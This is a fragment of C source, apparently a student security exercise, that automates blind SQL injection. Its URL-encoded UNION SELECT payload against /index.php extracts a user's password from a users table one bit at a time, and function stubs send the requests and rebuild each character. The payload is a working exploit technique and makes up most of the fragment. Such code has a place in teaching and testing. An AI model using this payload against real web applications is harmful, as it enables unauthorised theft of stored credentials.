...
#define CHARCTER_BIT 8 //num of bit for ascii charcter 
#define QUERY_SIZE 512
#define STUDENT_ID "336224076"

#define BASE_URL "/index.php?order_id=4%%20UNION%%20SELECT%%20((ASCII(SUBSTRING(password,%%20%d,%%201))" \
                  "%%20%%3E%%3E%%20%d)%%20%%26%%201)%%20FROM%%20users%%20WHERE%%20id%%20%%3D%%20%s--"
...
int send_request(int position, int bit) {
    ...
    char request[QUERY_SIZE], full_request[BUFFER_SIZE], response[BUFFER_SIZE];
...
char find_character(int position, int *query_count) {
    ...
    for (bit = 0; bit < CHARCTER_BIT; bit++) {
